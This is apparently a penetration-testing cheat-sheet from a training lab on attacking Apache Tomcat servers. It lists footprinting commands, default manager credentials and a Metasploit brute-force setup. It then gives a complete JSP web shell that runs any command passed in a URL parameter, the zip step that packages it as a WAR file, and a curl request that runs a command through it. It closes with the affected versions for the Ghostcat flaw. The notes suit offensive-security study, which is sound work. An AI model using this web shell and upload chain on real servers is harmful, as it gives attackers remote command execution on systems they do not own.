# Discovery/Footprinting
```
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
```
Distribution example 
- Path default
<img width="677" height="410" alt="image" src="https://github.com/user-attachments/assets/82a74705-d4ea-4dfe-aed3-438863a02282" />

- Path webpps
<img width="668" height="277" alt="image" src="https://github.com/user-attachments/assets/c9295c0b-f4d8-4332-9448-c08e52514ab8" />

The most important file WEB-INF/web.xml

NOte: default credentials -> tomcat:tomcat, admin:admin
# Attacks
## Login Brute Force
Using msf
```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

## WAR File Upload
create this .jsp
```
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

then 
```
zip -r backup.war cmd.jsp
```

After uploding the file 
```
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

# CVE-2020-1938 : Ghostcat
- affected at Apache Tomcat 9.0.0.M1 to 9.0.0.30
- affected at 8.5.0 to 8.5.50
- affected at 7.0.0 to 7.0.99 
